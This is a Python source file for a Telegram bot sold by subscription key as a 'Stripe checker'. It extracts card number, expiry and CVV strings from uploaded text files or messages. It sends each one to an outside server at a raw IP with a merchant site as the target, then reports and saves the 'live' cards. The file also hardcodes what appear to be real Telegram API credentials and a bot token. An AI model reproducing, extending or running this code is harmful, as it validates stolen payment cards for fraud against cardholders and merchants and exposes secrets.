from telethon import TelegramClient, events
import json, os, re, asyncio, datetime
import aiohttp
import aiofiles

# ================== CONFIG ==================
API_ID = 37235723
API_HASH = "880a876edaf529c8493b873d47821ec2"
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

OWNER_ID = 7077294261
ADMIN_ID = [7077294261]

PREMIUM_FILE = "premium.json"
BANNED_FILE = "banned_users.json"
KEYS_FILE = "keys.json"
CC_FILE = "approved.txt"

# ================== STRIPE CHECKER ==================
async def check_stripe(card: str, site: str = "redbluechair.com"):
    try:
        url = f"http://138.128.240.15:8009/stripe_auth?cc={card}&site={site}"
        timeout = aiohttp.ClientTimeout(total=50)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"Response": f"HTTP {res.status}", "Status": "Declined"}
                
                data = await res.json()
                response_text = data.get("Response", str(data))
                
                if isinstance(response_text, str) and response_text.startswith("{"):
                    try:
                        rj = json.loads(response_text)
                        response_text = rj.get("data", {}).get("error", {}).get("message", response_text)
                    except:
                        pass
                
                lower = str(response_text).lower()
                status = "Approved" if any(x in lower for x in ["approved", "success", "insufficient_funds"]) else "Declined"
                
                return {"Response": str(response_text)[:300], "Status": status}
    except Exception as e:
        return {"Response": f"Error: {str(e)[:100]}", "Status": "Declined"}


# ================== UTILITIES ==================
async def load_json(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as f:
                await f.write(json.dumps({}))
            return {}
        async with aiofiles.open(filename, "r") as f:
            content = await f.read().strip()
            return json.loads(content) if content else {}
    except:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps({}))
        return {}

async def save_json(filename, data):
    async with aiofiles.open(filename, "w") as f:
        await f.write(json.dumps(data, indent=4))

async def is_premium_user(user_id):
    data = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    if uid not in data:
        return False
    try:
        expiry = datetime.datetime.fromisoformat(data[uid]['expiry'])
        return datetime.datetime.now() <= expiry
    except:
        return False

async def is_banned_user(user_id):
    data = await load_json(BANNED_FILE)
    return str(user_id) in data

async def save_approved(card, response):
    async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
        await f.write(f"{card} | APPROVED | {response}\n")


# ================== NEW TXT FILE CHECK SYSTEM ==================
async def read_cards_from_txt(file_path):
    cards = []
    async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        content = await f.read()
        # Strong regex for cards
        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
        for c in found:
            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
            if len(cleaned.split('|')) == 4:
                cards.append(cleaned)
    return list(set(cards))  # remove duplicates


# ================== KEY SYSTEM ==================
async def generate_key(days: int = 30):
    import secrets
    key = "STRIPE-" + secrets.token_hex(8).upper()
    data = await load_json(KEYS_FILE)
    data[key] = {
        "days": days,
        "used": False,
        "created": str(datetime.datetime.now())
    }
    await save_json(KEYS_FILE, data)
    return key

async def redeem_key(user_id, key: str):
    data = await load_json(KEYS_FILE)
    premium_data = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    key = key.strip().upper()
    
    if key not in data or data[key].get("used"):
        return False, "❌ Invalid or already used key!"
    
    days = data[key]["days"]
    expiry = datetime.datetime.now() + datetime.timedelta(days=days)
    
    premium_data[uid] = {
        "expiry": expiry.isoformat(),
        "plan": f"{days} days"
    }
    
    data[key]["used"] = True
    data[key]["used_by"] = uid
    data[key]["used_at"] = str(datetime.datetime.now())
    
    await save_json(KEYS_FILE, data)
    await save_json(PREMIUM_FILE, premium_data)
    return True, f"✅ Success! Premium activated for {days} days."


# ================== BOT ==================
client = TelegramClient('stripe_bot', API_ID, API_HASH)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
async def start(event):
    if await is_banned_user(event.sender_id):
        return await event.reply("🚫 You are banned!")
    
    help_text = (
        "**🔥 NEW STRIPE CHECKER BOT v2.0**\n\n"
        "• Send `.txt` file with cards → Auto check\n"
        "• `/mst` + cards → Mass check\n"
        "• `/key <key>` → Redeem premium key\n\n"
        "Example card: `5443170628782539|06|30|222`\n"
        "Owner: `/genkey <days>`"
    )
    await event.reply(help_text)


# ================== NEW DOCUMENT HANDLER (TXT FILE) ==================
@client.on(events.NewMessage())
async def document_handler(event):
    if not event.document or await is_banned_user(event.sender_id):
        return
    
    filename = event.file.name or ""
    if not filename.lower().endswith('.txt'):
        return
    
    if not await is_premium_user(event.sender_id) and event.sender_id != OWNER_ID:
        return await event.reply("❌ Premium users only for .txt check!")
    
    await event.reply("📂 **TXT File Detected**\nDownloading & Processing...")
    
    file_path = f"./temp_{event.sender_id}.txt"
    await event.download_media(file_path)
    
    cards = await read_cards_from_txt(file_path)
    os.remove(file_path)
    
    if not cards:
        return await event.reply("❌ No valid cards found in TXT file!")
    
    cards = cards[:100]  # limit
    await event.reply(f"✅ **Found {len(cards)} cards**\nStarting New UI Check...")
    asyncio.create_task(process_mass(event, cards))


@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
async def genkey(event):
    if event.sender_id != OWNER_ID:
        return await event.reply("❌ Owner only!")
    days = int(event.pattern_match.group(1) or 30)
    key = await generate_key(days)
    await event.reply(f"✅ **New Key Generated**\n`{key}`\nValid for **{days}** days")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]key(?:\s+(.+))?$'))
async def redeem(event):
    if await is_banned_user(event.sender_id):
        return await event.reply("🚫 Banned!")
    key = event.pattern_match.group(1)
    if not key:
        return await event.reply("Usage: `/key YOURKEYHERE`")
    success, msg = await redeem_key(event.sender_id, key)
    await event.reply(msg)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
async def mst(event):
    if await is_banned_user(event.sender_id):
        return await event.reply("🚫 Banned!")
    
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        text = reply.text or ""
    else:
        text = event.raw_text

    cards = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', text)
    cards = [re.sub(r'[^0-9|]', '', c.replace(' ', '')) for c in cards]

    if not cards:
        return await event.reply("❌ No valid cards found!\nFormat: `5443170628782539|06|30|222`")

    cards = cards[:80]
    await event.reply(f"🚀 **New Check Started**\n**{len(cards)}** cards loaded...")
    asyncio.create_task(process_mass(event, cards))


# ================== NEW FANCY UI CHECKING ==================
async def process_mass(event, cards):
    total = len(cards)
    checked = approved = 0
    live = declined = 0
    
    # Beautiful Progress Message
    status_msg = await event.reply(
        "╔══════════════════════╗\n"
        "║   🔥 STRIPE CHECKER v2.0   ║\n"
        "╠══════════════════════╣\n"
        f"║ Total Cards : **{total}**     ║\n"
        f"║ Approved    : **0**           ║\n"
        f"║ Declined    : **0**           ║\n"
        f"║ Progress    : **0%**          ║\n"
        "╚══════════════════════╝"
    )

    for i in range(0, len(cards), 8):
        batch = cards[i:i+8]
        tasks = [check_stripe(card) for card in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for card, res in zip(batch, results):
            if isinstance(res, Exception):
                res = {"Response": "Error", "Status": "Declined"}
            
            checked += 1
            if res.get("Status") == "Approved":
                approved += 1
                live += 1
                await save_approved(card, res.get("Response"))
                await event.reply(
                    f"**💎 LIVE HIT!**\n"
                    f"`{card}`\n"
                    f"**Response:** {res.get('Response')[:150]}"
                )
            else:
                declined += 1

            progress = int((checked / total) * 100)
            
            try:
                await status_msg.edit(
                    "╔══════════════════════╗\n"
                    "║   🔥 STRIPE CHECKER v2.0   ║\n"
                    "╠══════════════════════╣\n"
                    f"║ Total Cards : **{total}**     ║\n"
                    f"║ Approved    : **{approved}**     ║\n"
                    f"║ Declined    : **{declined}**     ║\n"
                    f"║ Progress    : **{progress}%**    ║\n"
                    "╚══════════════════════╝"
                )
            except:
                pass

            await asyncio.sleep(1.2)

    await status_msg.edit(
        "╔══════════════════════╗\n"
        "║     ✅ CHECK FINISHED     ║\n"
        "╠══════════════════════╣\n"
        f"║ Approved : **{approved}**         ║\n"
        f"║ Declined : **{declined}**         ║\n"
        f"║ Total    : **{total}**            ║\n"
        "╚══════════════════════╝\n\n"
        "❤️ Thank you for using New Stripe Bot!"
    )


# ================== RUN ==================
async def main():
    print("🚀 Stripe Bot v2.0 Started | TXT + New UI Active")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
